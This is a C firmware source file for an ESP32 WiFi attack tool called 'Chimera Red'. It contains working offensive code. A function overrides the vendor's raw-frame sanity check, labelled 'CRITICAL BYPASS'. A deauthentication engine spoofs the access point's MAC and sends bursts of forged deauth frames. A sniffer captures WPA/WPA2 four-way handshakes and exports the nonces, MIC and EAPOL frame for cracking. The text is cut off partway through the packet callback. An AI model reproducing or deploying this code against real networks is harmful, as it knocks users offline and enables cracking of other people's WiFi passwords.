/**
 * @file wifi_manager.c
 * @brief WiFi Manager Implementation for Chimera Red - v2.2
 *
 * Fixes in v2.2:
 * - Thread-safe statistics with atomic operations
 * - Fixed address extraction for all ToDS/FromDS combinations
 * - Capped scan results to prevent memory exhaustion
 * - Better NULL checks and bounds validation
 * - Fixed race condition in sniffer stop
 * - Proper EAPOL frame capture with length validation
 */
#include "wifi_manager.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "serial_comm.h"
#include <rom/ets_sys.h>
#include <stdatomic.h>
#include <stdio.h>
#include <string.h>

static const char *TAG = "wifi_mgr";

/**
 * CRITICAL BYPASS: Override the ESP-IDF WiFi blob's frame sanity check.
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// Global state
static wifi_sniffer_cb_t g_sniffer_cb = NULL;
static wifi_handshake_cb_t g_handshake_cb = NULL;
static volatile bool g_promiscuous_active = false;
static volatile bool g_channel_hopping = false;
static volatile bool g_hopper_running = false;
static bool g_recon_mode = false;
static uint8_t g_current_channel = 1;
static uint16_t g_deauth_seq = 0;
static TaskHandle_t g_hopper_task = NULL;
static SemaphoreHandle_t g_wifi_mutex = NULL;
static SemaphoreHandle_t g_cache_mutex = NULL;

// Statistics (atomic for thread safety)
static atomic_uint_fast32_t g_m1_count = 0;
static atomic_uint_fast32_t g_m2_count = 0;
static atomic_uint_fast32_t g_complete_count = 0;
static atomic_uint_fast32_t g_pkt_count = 0;

// Smart Hopping Sequence (favors 1, 6, 11)
static const uint8_t hop_channels[] = {1, 1, 1, 2,  3,  4,  5,  6,  6, 6,
                                       7, 8, 9, 10, 11, 11, 11, 12, 13};
static int g_hop_index = 0;

// Handshake cache
#define HANDSHAKE_CACHE_SIZE 16
#define CACHE_TIMEOUT_MS 10000

typedef struct {
  uint8_t bssid[6];
  uint8_t sta[6];
  uint8_t anonce[32];
  uint8_t replay_counter[8];
  uint8_t key_desc_type;
  uint8_t key_desc_version;
  uint32_t last_seen;
  bool valid;
} handshake_cache_entry_t;

static handshake_cache_entry_t g_handshake_cache[HANDSHAKE_CACHE_SIZE];

// EAPOL constants
#define EAPOL_KEY_DESC_TYPE_OFFSET 0
#define EAPOL_KEY_INFO_OFFSET 1
#define EAPOL_KEY_LENGTH_OFFSET 3
#define EAPOL_KEY_REPLAY_OFFSET 5
#define EAPOL_KEY_NONCE_OFFSET 13
#define EAPOL_KEY_IV_OFFSET 45
#define EAPOL_KEY_RSC_OFFSET 61
#define EAPOL_KEY_ID_OFFSET 69
#define EAPOL_KEY_MIC_OFFSET 77
#define EAPOL_KEY_DATA_LEN_OFFSET 93
#define EAPOL_KEY_MIN_LEN 95

static const uint8_t LLC_SNAP_EAPOL[] = {0xAA, 0xAA, 0x03, 0x00,
                                         0x00, 0x00, 0x88, 0x8E};

// Forward declarations
static void promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void channel_hopper_task(void *arg);
static void process_eapol(const uint8_t *payload, int len, int header_len,
                          const wifi_pkt_rx_ctrl_t *rx_ctrl);

/**
 * @brief Get milliseconds since boot
 */
static inline uint32_t get_timestamp_ms(void) {
  return (uint32_t)(esp_timer_get_time() / 1000);
}

/**
 * @brief Calculate 802.11 MAC header length
 */
static inline int calc_80211_header_len(uint8_t fc0, uint8_t fc1) {
  int len = 24;
  uint8_t type = (fc0 >> 2) & 0x03;
  uint8_t subtype = (fc0 >> 4) & 0x0F;

  // QoS data frames have 2 extra bytes
  if (type == 2 && (subtype & 0x08)) {
    len += 2;
  }
  // HT Control field (+4 bytes) if Order bit set
  if (fc1 & 0x80) {
    len += 4;
  }
  // 4-address format (WDS) adds 6 bytes for Address4
  if ((fc1 & 0x03) == 0x03) {
    len += 6;
  }
  return len;
}

/**
 * @brief Extract addresses from 802.11 data frame based on ToDS/FromDS bits
 *
 * ToDS FromDS  Addr1    Addr2    Addr3    Addr4
 *  0     0     DA       SA       BSSID    -      (IBSS)
 *  0     1     DA       BSSID    SA       -      (From AP)
 *  1     0     BSSID    SA       DA       -      (To AP)
 *  1     1     RA       TA       DA       SA     (WDS)
 */
static void extract_data_frame_addrs(const uint8_t *payload, uint8_t fc1,
                                     const uint8_t **bssid, const uint8_t **sta,
                                     const uint8_t **da) {
  uint8_t to_ds = fc1 & 0x01;
  uint8_t from_ds = (fc1 >> 1) & 0x01;

  if (!to_ds && !from_ds) {
    // IBSS (Ad-hoc)
    if (da)
      *da = payload + 4;
    if (sta)
      *sta = payload + 10; // SA
    if (bssid)
      *bssid = payload + 16;
  } else if (!to_ds && from_ds) {
    // From AP to Station (e.g., M1, M3)
    if (da)
      *da = payload + 4; // Destination = Station
    if (bssid)
      *bssid = payload + 10;
    if (sta)
      *sta = payload + 4; // Station is the destination in FromDS
  } else if (to_ds && !from_ds) {
    // From Station to AP (e.g., M2, M4)
    if (bssid)
      *bssid = payload + 4;
    if (sta)
      *sta = payload + 10; // SA = Station
    if (da)
      *da = payload + 16;
  } else {
    // WDS (4-address mode)
    if (da)
      *da = payload + 16; // Addr3
    if (sta)
      *sta = payload + 22; // Addr4 (SA)
    if (bssid)
      *bssid = payload + 4; // Use RA as BSSID approximation
  }
}

/**
 * @brief Convert bytes to hex string
 */
static void bytes_to_hex(const uint8_t *bytes, int len, char *hex_out,
                         size_t hex_size) {
  if (hex_size < (size_t)(len * 2 + 1)) {
    hex_out[0] = '\0';
    return;
  }
  for (int i = 0; i < len; i++) {
    sprintf(hex_out + i * 2, "%02X", bytes[i]);
  }
  hex_out[len * 2] = '\0';
}

// ======================== PUBLIC API ========================

esp_err_t wifi_manager_init(void) {
  ESP_LOGI(TAG, "Initializing WiFi Manager v2.2...");

  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES ||
      ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  ESP_ERROR_CHECK(esp_netif_init());
  ESP_ERROR_CHECK(esp_event_loop_create_default());

  esp_netif_create_default_wifi_ap();
  esp_netif_create_default_wifi_sta();

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  cfg.nvs_enable = 1;
  cfg.rx_ba_win = 16;
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

  g_wifi_mutex = xSemaphoreCreateMutex();
  if (g_wifi_mutex == NULL) {
    ESP_LOGE(TAG, "Failed to create WiFi mutex");
    return ESP_FAIL;
  }

  g_cache_mutex = xSemaphoreCreateMutex();
  if (g_cache_mutex == NULL) {
    vSemaphoreDelete(g_wifi_mutex);
    g_wifi_mutex = NULL;
    ESP_LOGE(TAG, "Failed to create cache mutex");
    return ESP_FAIL;
  }

  wifi_clear_handshake_cache();
  ESP_LOGI(TAG, "WiFi Manager initialized successfully");
  return ESP_OK;
}

void wifi_manager_deinit(void) {
  wifi_sniffer_stop();
  esp_wifi_stop();
  esp_wifi_deinit();

  if (g_wifi_mutex) {
    vSemaphoreDelete(g_wifi_mutex);
    g_wifi_mutex = NULL;
  }
  if (g_cache_mutex) {
    vSemaphoreDelete(g_cache_mutex);
    g_cache_mutex = NULL;
  }
}

void wifi_clear_handshake_cache(void) {
  if (g_cache_mutex) {
    xSemaphoreTake(g_cache_mutex, portMAX_DELAY);
  }
  memset(g_handshake_cache, 0, sizeof(g_handshake_cache));
  if (g_cache_mutex) {
    xSemaphoreGive(g_cache_mutex);
  }
  atomic_store(&g_m1_count, 0);
  atomic_store(&g_m2_count, 0);
  atomic_store(&g_complete_count, 0);
}

void wifi_get_handshake_stats(uint32_t *m1_count, uint32_t *m2_count,
                              uint32_t *complete_count) {
  if (m1_count)
    *m1_count = atomic_load(&g_m1_count);
  if (m2_count)
    *m2_count = atomic_load(&g_m2_count);
  if (complete_count)
    *complete_count = atomic_load(&g_complete_count);
}

esp_err_t wifi_scan_start(wifi_scan_cb_t callback) {
  if (!g_wifi_mutex) {
    return ESP_ERR_INVALID_STATE;
  }

  xSemaphoreTake(g_wifi_mutex, portMAX_DELAY);

  if (g_promiscuous_active) {
    esp_wifi_set_promiscuous(false);
    g_promiscuous_active = false;
  }

  esp_wifi_stop();
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
  ESP_ERROR_CHECK(esp_wifi_start());

  wifi_scan_config_t scan_config = {
      .ssid = NULL,
      .bssid = NULL,
      .channel = 0,
      .show_hidden = true,
      .scan_type = WIFI_SCAN_TYPE_ACTIVE,
      .scan_time.active.min = 120,
      .scan_time.active.max = 350,
  };

  esp_err_t ret = esp_wifi_scan_start(&scan_config, true);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Scan start failed: %d", ret);
    xSemaphoreGive(g_wifi_mutex);
    return ret;
  }

  uint16_t ap_count = 0;
  esp_wifi_scan_get_ap_num(&ap_count);

  // Cap results to prevent memory exhaustion
  if (ap_count > MAX_SCAN_RESULTS) {
    ap_count = MAX_SCAN_RESULTS;
  }

  if (ap_count > 0) {
    wifi_ap_record_t *ap_list = malloc(sizeof(wifi_ap_record_t) * ap_count);
    if (ap_list) {
      uint16_t actual_count = ap_count;
      esp_wifi_scan_get_ap_records(&actual_count, ap_list);

      char *json_buf = malloc(16384);
      if (json_buf) {
        int pos = snprintf(json_buf, 16384,
                           "{\"type\":\"wifi_scan_result\",\"count\":%d,"
                           "\"networks\":[",
                           actual_count);

        for (int i = 0; i < actual_count && pos < 15800; i++) {
          wifi_scan_result_t result = {0};
          strncpy(result.ssid, (char *)ap_list[i].ssid, 32);
          result.ssid[32] = '\0';
          memcpy(result.bssid, ap_list[i].bssid, 6);
          result.channel = ap_list[i].primary;
          result.rssi = ap_list[i].rssi;
          result.authmode = ap_list[i].authmode;

          if (callback) {
            callback(&result);
          }

          char bssid_str[18];
          snprintf(bssid_str, sizeof(bssid_str),
                   "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0],
                   result.bssid[1], result.bssid[2], result.bssid[3],
                   result.bssid[4], result.bssid[5]);

          char escaped_ssid[65];
          serial_escape_json(result.ssid, escaped_ssid, sizeof(escaped_ssid));

          pos += snprintf(
              json_buf + pos, 16384 - pos,
              "{\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,"
              "\"channel\":%d,\"encryption\":%d}%s",
              escaped_ssid, bssid_str, result.rssi, result.channel,
              result.authmode, (i < actual_count - 1) ? "," : "");
        }

        if (pos < 16382) {
          strcat(json_buf, "]}");
        }
        serial_send_json_raw(json_buf);
        free(json_buf);
      }
      free(ap_list);
    }
  }

  xSemaphoreGive(g_wifi_mutex);
  return ESP_OK;
}

static void channel_hopper_task(void *arg) {
  g_hopper_running = true;

  while (g_channel_hopping) {
    g_hop_index =
        (g_hop_index + 1) % (sizeof(hop_channels) / sizeof(hop_channels[0]));
    g_current_channel = hop_channels[g_hop_index];
    esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(250));
  }

  g_hopper_running = false;
  g_hopper_task = NULL;
  vTaskDelete(NULL);
}

esp_err_t wifi_sniffer_start(uint8_t channel) {
  if (!g_wifi_mutex) {
    return ESP_ERR_INVALID_STATE;
  }

  xSemaphoreTake(g_wifi_mutex, portMAX_DELAY);

  ESP_LOGI(TAG, "Starting sniffer on channel %d (0=hopping)", channel);

  // Stop any existing hopper
  g_channel_hopping = false;
  while (g_hopper_running) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  esp_wifi_stop();
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

  wifi_config_t ap_config = {
      .ap = {
          .ssid = "chimera_red_mon",
          .ssid_len = 15,
          .password = "security",
          .channel = (channel > 0 && channel <= 13) ? channel : 1,
          .authmode = WIFI_AUTH_WPA2_PSK,
          .ssid_hidden = 1,
          .max_connection = 0,
          .beacon_interval = 60000,
      }};
  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
  ESP_ERROR_CHECK(esp_wifi_start());
  ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

  g_current_channel = (channel > 0 && channel <= 13) ? channel : 1;
  ESP_ERROR_CHECK(
      esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE));

  wifi_promiscuous_filter_t filter = {.filter_mask =
                                          WIFI_PROMIS_FILTER_MASK_MGMT |
                                          WIFI_PROMIS_FILTER_MASK_DATA};
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(promisc_rx_cb));
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

  g_promiscuous_active = true;

  if (channel == 0) {
    g_channel_hopping = true;
    xTaskCreate(channel_hopper_task, "ch_hopper", 2048, NULL, 5,
                &g_hopper_task);
    ESP_LOGI(TAG, "Channel hopping enabled");
  }

  xSemaphoreGive(g_wifi_mutex);
  ESP_LOGI(TAG, "Sniffer started successfully");
  return ESP_OK;
}

esp_err_t wifi_sniffer_stop(void) {
  if (!g_wifi_mutex) {
    return ESP_ERR_INVALID_STATE;
  }

  xSemaphoreTake(g_wifi_mutex, portMAX_DELAY);

  // Stop channel hopping and wait for task to finish
  g_channel_hopping = false;
  int timeout = 50; // 500ms max wait
  while (g_hopper_running && timeout > 0) {
    vTaskDelay(pdMS_TO_TICKS(10));
    timeout--;
  }

  esp_wifi_set_promiscuous(false);
  g_promiscuous_active = false;

  xSemaphoreGive(g_wifi_mutex);
  return ESP_OK;
}

void wifi_set_channel_hopping(bool enable) {
  if (enable && !g_channel_hopping && g_promiscuous_active) {
    g_channel_hopping = true;
    xTaskCreate(channel_hopper_task, "ch_hopper", 2048, NULL, 5,
                &g_hopper_task);
  } else if (!enable) {
    g_channel_hopping = false;
  }
}

esp_err_t wifi_set_channel(uint8_t channel) {
  if (channel < 1 || channel > 13) {
    return ESP_ERR_INVALID_ARG;
  }
  g_current_channel = channel;
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

uint8_t wifi_get_channel(void) { return g_current_channel; }

// ======================== DEAUTH ENGINE ========================

esp_err_t wifi_send_deauth_burst(const uint8_t *target_mac,
                                 const uint8_t *ap_mac, uint8_t channel,
                                 uint16_t reason, int count) {
  if (!ap_mac || !g_wifi_mutex) {
    return ESP_ERR_INVALID_ARG;
  }

  if (channel == 0) {
    channel = g_current_channel;
  }

  ESP_LOGI(TAG, "Deauth BURST(%d) to %02X:%02X... from %02X:%02X... ch%d",
           count, target_mac ? target_mac[0] : 0xFF,
           target_mac ? target_mac[5] : 0xFF, ap_mac[0], ap_mac[5], channel);

  bool was_promisc = g_promiscuous_active;
  bool was_hopping = g_channel_hopping;
  uint8_t original_mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, original_mac);

  // Stop hopping
  if (was_hopping) {
    g_channel_hopping = false;
    while (g_hopper_running) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
  }

  if (was_promisc) {
    esp_wifi_set_promiscuous(false);
  }

  esp_wifi_stop();
  esp_wifi_set_mac(WIFI_IF_AP, ap_mac);

  wifi_config_t ap_config = {
      .ap = {
          .ssid = "",
          .ssid_len = 0,
          .password = "",
          .channel = (channel > 0 && channel <= 13) ? channel : g_current_channel,
          .authmode = WIFI_AUTH_OPEN,
          .ssid_hidden = 1,
          .max_connection = 0,
          .beacon_interval = 60000,
      }};

  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
  ESP_ERROR_CHECK(esp_wifi_start());
  ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
  ESP_ERROR_CHECK(esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE));

  esp_wifi_set_promiscuous(true);
  vTaskDelay(pdMS_TO_TICKS(10));

  // Build deauth frame
  uint8_t frame[26] = {
      0xC0, 0x00,                         // Frame Control (Deauth)
      0x00, 0x00,                         // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA (broadcast or target)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA (AP MAC)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
      0x00, 0x00,                         // Seq Ctrl
      0x07, 0x00                          // Reason code
  };

  if (target_mac) {
    memcpy(frame + 4, target_mac, 6);
  }
  memcpy(frame + 10, ap_mac, 6);
  memcpy(frame + 16, ap_mac, 6);

  static const uint16_t reasons[] = {7, 6, 2, 4, 1};
  static const int num_reasons = sizeof(reasons) / sizeof(reasons[0]);

  int sent = 0;
  for (int i = 0; i < count; i++) {
    int r_idx = g_deauth_seq % num_reasons;
    frame[24] = reasons[r_idx] & 0xFF;
    frame[25] = (reasons[r_idx] >> 8) & 0xFF;

    // Set sequence number (upper 12 bits of seq ctrl)
    frame[22] = (g_deauth_seq & 0x0F) << 4;
    frame[23] = (g_deauth_seq >> 4) & 0xFF;
    g_deauth_seq++;

    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
    if (ret == ESP_OK) {
      sent++;
    }

    if (i % 5 == 0) {
      vTaskDelay(pdMS_TO_TICKS(2));
    } else {
      ets_delay_us(500);
    }
  }

  // Restore state
  esp_wifi_stop();
  esp_wifi_set_mac(WIFI_IF_AP, original_mac);

  if (was_promisc) {
    wifi_sniffer_start(channel); // Resume on target channel
    if (was_hopping) {
      g_channel_hopping = true;
      xTaskCreate(channel_hopper_task, "ch_hopper", 2048, NULL, 5,
                  &g_hopper_task);
    }
  }

  ESP_LOGI(TAG, "Deauth burst complete: %d/%d sent", sent, count);
  return (sent > 0) ? ESP_OK : ESP_FAIL;
}

esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac,
                           uint8_t channel, uint16_t reason) {
  return wifi_send_deauth_burst(target_mac, ap_mac, channel, reason, 1);
}

void wifi_set_sniffer_callback(wifi_sniffer_cb_t cb) { g_sniffer_cb = cb; }
void wifi_set_handshake_callback(wifi_handshake_cb_t cb) { g_handshake_cb = cb; }
void wifi_start_recon_mode(void) { g_recon_mode = true; }
void wifi_stop_recon_mode(void) { g_recon_mode = false; }
bool wifi_is_sniffing(void) { return g_promiscuous_active; }

// ======================== EAPOL PROCESSING ========================

static void process_eapol(const uint8_t *payload, int len, int header_len,
                          const wifi_pkt_rx_ctrl_t *rx_ctrl) {
  // Minimum: header + LLC/SNAP (8) + EAPOL header (4) + key body
  int min_len = header_len + 8 + 4 + EAPOL_KEY_MIN_LEN;
  if (len < min_len) {
    return;
  }

  const uint8_t *llc = payload + header_len;
  if (memcmp(llc, LLC_SNAP_EAPOL, sizeof(LLC_SNAP_EAPOL)) != 0) {
    return;
  }

  const uint8_t *eapol_hdr = llc + 8;
  uint8_t eapol_version = eapol_hdr[0];
  uint8_t eapol_type = eapol_hdr[1];
  uint16_t eapol_body_len = (eapol_hdr[2] << 8) | eapol_hdr[3];

  (void)eapol_version; // Suppress unused warning

  if (eapol_type != 3) {
    return; // Not EAPOL-Key
  }

  int eapol_start = header_len + 8;
  int eapol_total_len = 4 + eapol_body_len;

  if (len < eapol_start + eapol_total_len) {
    return; // Truncated packet
  }

  if (eapol_body_len < EAPOL_KEY_MIN_LEN) {
    return; // Invalid key body
  }

  const uint8_t *eapol = eapol_hdr + 4; // EAPOL-Key body

  uint8_t key_desc_type = eapol[EAPOL_KEY_DESC_TYPE_OFFSET];
  if (key_desc_type != 0x02 && key_desc_type != 0xFE) {
    return; // Not WPA2 (RSN) or WPA1
  }

  uint16_t key_info =
      (eapol[EAPOL_KEY_INFO_OFFSET] << 8) | eapol[EAPOL_KEY_INFO_OFFSET + 1];
  uint8_t key_desc_version = key_info & 0x07;

  bool key_ack = (key_info & 0x0080) != 0;
  bool key_mic = (key_info & 0x0100) != 0;
  bool key_secure = (key_info & 0x0200) != 0;

  uint8_t fc1 = payload[1];
  const uint8_t *bssid = NULL;
  const uint8_t *sta = NULL;
  extract_data_frame_addrs(payload, fc1, &bssid, &sta, NULL);

  if (!bssid || !sta) {
    return;
  }

  if (key_ack && !key_mic) {
    // ==================== MESSAGE 1/4 ====================
    atomic_fetch_add(&g_m1_count, 1);

    ESP_LOGD(TAG, "EAPOL M1 from %02X:%02X:%02X:%02X:%02X:%02X", bssid[0],
             bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

    if (g_cache_mutex) {
      xSemaphoreTake(g_cache_mutex, portMAX_DELAY);
    }

    // Find slot for caching
    int slot = -1;
    uint32_t now = get_timestamp_ms();
    uint32_t oldest_time = UINT32_MAX;
    int oldest_slot = 0;

    for (int i = 0; i < HANDSHAKE_CACHE_SIZE; i++) {
      if (!g_handshake_cache[i].valid) {
        slot = i;
        break;
      }
      // Expire old entries
      if ((now - g_handshake_cache[i].last_seen) > CACHE_TIMEOUT_MS) {
        slot = i;
        break;
      }
      if (g_handshake_cache[i].last_seen < oldest_time) {
        oldest_time = g_handshake_cache[i].last_seen;
        oldest_slot = i;
      }
    }

    if (slot == -1) {
      slot = oldest_slot;
    }

    // Cache M1 data
    memcpy(g_handshake_cache[slot].bssid, bssid, 6);
    memcpy(g_handshake_cache[slot].sta, sta, 6);
    memcpy(g_handshake_cache[slot].anonce, eapol + EAPOL_KEY_NONCE_OFFSET, 32);
    memcpy(g_handshake_cache[slot].replay_counter,
           eapol + EAPOL_KEY_REPLAY_OFFSET, 8);
    g_handshake_cache[slot].key_desc_type = key_desc_type;
    g_handshake_cache[slot].key_desc_version = key_desc_version;
    g_handshake_cache[slot].last_seen = now;
    g_handshake_cache[slot].valid = true;

    if (g_cache_mutex) {
      xSemaphoreGive(g_cache_mutex);
    }

  } else if (key_mic && !key_ack && !key_secure) {
    // ==================== MESSAGE 2/4 ====================
    atomic_fetch_add(&g_m2_count, 1);

    ESP_LOGD(TAG, "EAPOL M2 from STA %02X:%02X:%02X:%02X:%02X:%02X", sta[0],
             sta[1], sta[2], sta[3], sta[4], sta[5]);

    if (g_cache_mutex) {
      xSemaphoreTake(g_cache_mutex, portMAX_DELAY);
    }

    // Find matching M1
    for (int i = 0; i < HANDSHAKE_CACHE_SIZE; i++) {
      if (!g_handshake_cache[i].valid)
        continue;
      if (memcmp(g_handshake_cache[i].bssid, bssid, 6) != 0)
        continue;
      if (memcmp(g_handshake_cache[i].sta, sta, 6) != 0)
        continue;

      // ==================== COMPLETE HANDSHAKE ====================
      atomic_fetch_add(&g_complete_count, 1);

      wifi_handshake_t hs = {0};

      memcpy(hs.bssid, bssid, 6);
      memcpy(hs.sta, sta, 6);
      memcpy(hs.anonce, g_handshake_cache[i].anonce, 32);
      memcpy(hs.snonce, eapol + EAPOL_KEY_NONCE_OFFSET, 32);
      memcpy(hs.mic, eapol + EAPOL_KEY_MIC_OFFSET, 16);
      memcpy(hs.replay_counter, g_handshake_cache[i].replay_counter, 8);

      hs.key_desc_type = g_handshake_cache[i].key_desc_type;
      hs.key_desc_version = g_handshake_cache[i].key_desc_version;

      // Copy FULL EAPOL frame for MIC verification
      int frame_len = eapol_total_len;
      if (frame_len > MAX_EAPOL_FRAME_SIZE) {
        frame_len = MAX_EAPOL_FRAME_SIZE;
      }
      memcpy(hs.eapol_frame, eapol_hdr, frame_len);
      hs.eapol_len = frame_len;

      hs.channel = rx_ctrl->channel;
      hs.rssi = rx_ctrl->rssi;
      hs.timestamp = get_timestamp_ms();
      hs.has_m1 = true;
      hs.has_m2 = true;
      hs.complete = true;

      // Invalidate cache entry before releasing mutex
      g_handshake_cache[i].valid = false;

      if (g_cache_mutex) {
        xSemaphoreGive(g_cache_mutex);
      }

      // Callback (outside mutex)
      if (g_handshake_cb) {
        g_handshake_cb(&hs);
      }

      // Format and send JSON
      char bssid_s[18], sta_s[18];
      snprintf(bssid_s, sizeof(bssid_s), "%02X:%02X:%02X:%02X:%02X:%02X",
               hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4],
               hs.bssid[5]);
      snprintf(sta_s, sizeof(sta_s), "%02X:%02X:%02X:%02X:%02X:%02X", hs.sta[0],
               hs.sta[1], hs.sta[2], hs.sta[3], hs.sta[4], hs.sta[5]);

      char *json = malloc(2048);
      if (json) {
        char anonce_hex[65], snonce_hex[65], mic_hex[33], replay_hex[17];
        bytes_to_hex(hs.anonce, 32, anonce_hex, sizeof(anonce_hex));
        bytes_to_hex(hs.snonce, 32, snonce_hex, sizeof(snonce_hex));
        bytes_to_hex(hs.mic, 16, mic_hex, sizeof(mic_hex));
        bytes_to_hex(hs.replay_counter, 8, replay_hex, sizeof(replay_hex));

        char *eapol_hex = malloc(hs.eapol_len * 2 + 1);
        if (eapol_hex) {
          bytes_to_hex(hs.eapol_frame, hs.eapol_len, eapol_hex,
                       hs.eapol_len * 2 + 1);

          snprintf(json, 2048,
                   "{\"type\":\"wifi_handshake\","
                   "\"bssid\":\"%s\","
                   "\"sta_mac\":\"%s\","
                   "\"ch\":%d,"
                   "\"rssi\":%d,"
                   "\"anonce\":\"%s\","
                   "\"snonce\":\"%s\","
                   "\"mic\":\"%s\","
                   "\"replay_counter\":\"%s\","
                   "\"key_desc_type\":%d,"
                   "\"key_desc_version\":%d,"
                   "\"eapol_frame\":\"%s\","
                   "\"eapol_len\":%d,"
                   "\"timestamp\":%lu}",
                   bssid_s, sta_s, hs.channel, hs.rssi, anonce_hex, snonce_hex,
                   mic_hex, replay_hex, hs.key_desc_type, hs.key_desc_version,
                   eapol_hex, hs.eapol_len, (unsigned long)hs.timestamp);

          serial_send_json_raw(json);
          free(eapol_hex);
        }
        free(json);
      }

      ESP_LOGI(TAG, "HANDSHAKE #%lu CAPTURED: %s <-> %s (v%d)",
               (unsigned long)atomic_load(&g_complete_count), bssid_s, sta_s,
               hs.key_desc_version);

      return; // Already released mutex and processed
    }

    if (g_cache_mutex) {
      xSemaphoreGive(g_cache_mutex);
    }
  }
}

static void promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf) {
    return;
  }

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;

  // Visual feedback with packet stats
  uint32_t count = atomic_fetch_add(&g_pkt_count, 1) + 1;
  static int acc_rssi = 0;
  static int acc_samples = 0;

  acc_rssi += pkt->rx_ctrl.rssi;
  acc_samples++;

  if (acc_samples >= 10) {
    char pulse_json[80];
    int avg = acc_rssi / acc_samples;
    int val = (avg >= -30) ? 100 : (avg <= -95) ? 0 : (int)((avg + 95) * 1.54);

    snprintf(pulse_json, sizeof(pulse_json),
             "{\"type\":\"pulse\",\"val\":%d,\"ch\":%d}", val,
             pkt->rx_ctrl.channel);
    serial_send_json_raw(pulse_json);

    acc_rssi = 0;
    acc_samples = 0;
  }

  if (count % 100 == 0) {
    char stats[128];
    snprintf(
        stats, sizeof(stats),
        "{\"type\":\"sniff_stats\",\"count\":%lu,\"m1\":%lu,\"m2\":%lu,"
        "\"complete\":%lu}",
        (unsigned long)count, (unsigned long)atomic_load(&g_m1_count),
        (unsigned long)atomic_load(&g_m2_count),
        (unsigned long)atomic_load(&g_complete_count));
    serial_send_json_raw(stats);
  }

  if (g_sniffer_cb) {
    g_sniffer_cb(buf, type);
  }

  int len = pkt->rx_ctrl.sig_len;
  uint8_t *payload = pkt->payload;

  if (len < 24) {
    return;
  }

  uint8_t fc0 = payload[0];
  uint8_t fc1 = payload[1];
  uint8_t frame_type = (fc0 >> 2) & 0x03;
  uint8_t frame_subtype = (fc0 >> 4) & 0x0F;

  // Management frames
  if (type == WIFI_PKT_MGMT) {
    if (frame_type == 0 && frame_subtype == 4) {
      // Probe Request
      char sa_str[18];
      snprintf(sa_str, sizeof(sa_str), "%02X:%02X:%02X:%02X:%02X:%02X",
               payload[10], payload[11], payload[12], payload[13], payload[14],
               payload[15]);

      int pos = 24;
      if (pos + 2 <= len && payload[pos] == 0) {
        int ssid_len = payload[pos + 1];
        if (ssid_len > 0 && ssid_len <= 32 && (pos + 2 + ssid_len <= len)) {
          char ssid[33] = {0};
          memcpy(ssid, payload + pos + 2, ssid_len);

          char json[256];
          char esc_ssid[65];
          serial_escape_json(ssid, esc_ssid, sizeof(esc_ssid));

          snprintf(json, sizeof(json),
                   "{\"type\":\"client_probe\",\"mac\":\"%s\","
                   "\"ssid\":\"%s\",\"rssi\":%d}",
                   sa_str, esc_ssid, pkt->rx_ctrl.rssi);
          serial_send_json_raw(json);
        }
      }
    } else if (frame_type == 0 && frame_subtype == 8 && g_recon_mode) {
      // Beacon in recon mode
      if (len < 36)
        return;

      char bssid_str[18];
      snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
               payload[16], payload[17], payload[18], payload[19], payload[20],
               payload[21]);

      int pos = 36;
      if (pos + 2 <= len && payload[pos] == 0) {
        int ssid_len = payload[pos + 1];
        if (ssid_len > 0 && ssid_len <= 32 && (pos + 2 + ssid_len <= len)) {
          char ssid[33] = {0};
          memcpy(ssid, payload + pos + 2, ssid_len);

          char json[256];
          char esc[65];
          serial_escape_json(ssid, esc, sizeof(esc));
          snprintf(json, sizeof(json),
                   "{\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,\"ch\":%d}",
                   esc, bssid_str, pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel);
          serial_send_json("recon", json);
        }
      }
    }
    return;
